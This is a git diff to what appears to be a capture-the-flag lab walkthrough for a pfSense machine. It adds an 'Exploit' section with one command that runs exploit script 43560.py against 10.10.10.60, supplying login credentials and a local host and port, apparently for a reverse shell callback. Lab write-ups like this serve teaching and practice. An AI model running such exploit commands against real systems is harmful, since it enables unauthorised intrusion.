@@ -76,6 +76,13 @@ Nmap done: 1 IP address (1 host up) scanned in 25.14 seconds
 ![image](https://user-images.githubusercontent.com/83878909/234788791-20fa0822-ab0f-436c-9c6c-0da7410f5969.png)
 ![image](https://user-images.githubusercontent.com/83878909/234789403-f7e2d729-499e-4a74-bec7-70138323b219.png)
 
+---
+
+## Exploit
+
 ```CSS
-▶ 
+▶ python 43560.py --rhost 10.10.10.60 --lhost 10.10.14.25 --lport 8080 --username rohit --password pfsense
 ```
+![image](https://user-images.githubusercontent.com/83878909/234790629-5b68be45-a846-43b6-82bd-7cdd8a5a9114.png)
+
+---
